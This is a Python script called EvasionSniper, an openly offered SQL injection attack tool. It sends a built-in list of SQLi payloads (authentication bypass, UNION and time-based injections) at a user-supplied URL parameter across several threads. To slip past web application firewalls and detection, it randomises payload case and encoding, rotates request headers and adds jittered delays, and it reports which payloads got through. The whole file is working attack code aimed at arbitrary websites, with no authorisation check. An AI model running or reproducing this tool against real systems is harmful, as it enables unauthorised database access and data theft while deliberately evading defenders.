#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EvasionSniper v3.5
# Brutal SQLi Payload Launcher with Multi-threading, WAF Detection & Fancy UI (by 0x6ick)

import requests
import random
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Banner
def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
  ______                 _             _____       _                 
 |  ____|               (_)           / ____|     | |                
 | |__   _ __ ___  _ __  _  ___ ___  | (___   __ _| | ___  ___  _ __ 
 |  __| | '_ ` _ \| '_ \| |/ __/ _ \  \___ \ / _` | |/ _ \/ _ \| '__|
 | |____| | | | | | |_) | | (_|  __/  ____) | (_| | |  __/ (_) | |   
 |______|_| |_| |_| .__/|_|\___\___| |_____/ \__,_|_|\___|\___/|_|   
                  | |      EvasionSniper v3.5 by 0x6ick        
                  |_|                                               
    """ + Style.RESET_ALL)

# Built-in OWASP + Custom Payload Pool
BUILTIN_PAYLOADS = [
    "' OR '1'='1'--", "' OR 1=1--", "' OR 'a'='a'--", "' UNION SELECT NULL--",
    "admin'--", "admin' #", "admin'/*", "' or ''-'", "' or '' ' --",
    "' or 1=1#", "') or ('1'='1'--", "') or ('1'='1'#", "' OR SLEEP(5)--",
    "' OR benchmark(5000000,MD5(1))--", "' OR 2 LIKE 2--", "' OR 2 LIKE 2#",
    "' OR 2 LIKE 2/*", "'/**/OR/**/1=1--", "'/*!50000UNION*/ SELECT NULL--"
]

# Sample User-Agents for header randomizer
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

def load_payloads(custom_file=None):
    payloads = BUILTIN_PAYLOADS.copy()
    if custom_file:
        try:
            with open(custom_file, 'r') as f:
                extra = [line.strip() for line in f if line.strip()]
            payloads.extend(extra)
        except IOError:
            print(Fore.YELLOW + f"[!] Could not read custom file: {custom_file}")
    return payloads

def randomize(p):
    shuffled = ''.join(c.upper() if random.choice([0,1]) else c.lower() for c in p)
    return urllib.parse.quote(shuffled) if random.choice([True,False]) else shuffled

def rand_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": "https://" + random.choice(USER_AGENTS).split(' ')[0]
    }

def shoot(target, param, payload):
    url = f"{target}?{param}={payload}"
    try:
        resp = requests.get(url, headers=rand_headers(), timeout=5)
        status = resp.status_code
        length = len(resp.text)
        blocked = status in (403,406) or any(w in resp.text.lower() for w in ['blocked','waf'])
        return payload, status, length, blocked
    except:
        return payload, None, None, False

def sniper(target, param, payloads, threads=5, delay_min=0.5, delay_max=1.5, result_file=None):
    total = len(payloads)
    print(Fore.MAGENTA + f"Target: {target} | Param: {param}")
    print(Fore.MAGENTA + f"Threads: {threads} | Payloads: {total}\n" + Style.RESET_ALL)

    if not result_file and total > 20:
        result_file = f"result_{int(time.time())}.txt"
        print(Fore.BLUE + f"Auto-save enabled. Results will save to {result_file}" + Style.RESET_ALL)

    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(shoot, target, param, randomize(p)): p for p in payloads}
        for idx, future in enumerate(as_completed(futures), 1):
            payload, status, length, blocked = future.result()
            marker = "[X] BLOCKED" if blocked else "[!] Passed" if status and status < 400 else "[ ]"
            output = f"[{idx}/{total}] {marker} Payload: {urllib.parse.unquote(payload)} | Status: {status} | Len: {length}"
            if "BLOCKED" in marker:
                print(Fore.RED + output)
            elif "Passed" in marker:
                print(Fore.GREEN + output)
            else:
                print(Fore.YELLOW + output)
            results.append(output)
            time.sleep(random.uniform(delay_min, delay_max))

    if result_file:
        with open(result_file, 'w') as f:
            f.write("\n".join(results))
        print(Fore.CYAN + f"\nResults saved to {result_file}" + Style.RESET_ALL)

if __name__ == "__main__":
    banner()
    print(Style.BRIGHT + "=== EvasionSniper v3.5 by 0x6ick ===\n")
    target = input("Enter target URL (e.g., http://site.com/page.php): ")
    param = input("Enter vulnerable param (e.g., id): ")
    th = input("Threads (default 5): ")
    threads = int(th) if th.strip() else 5
    custom = input("Custom payload file (optional): ") or None
    result_file = input("Save results to file (optional): ") or None
    payloads = load_payloads(custom)
    sniper(target, param, payloads, threads, 0.5, 1.5, result_file)
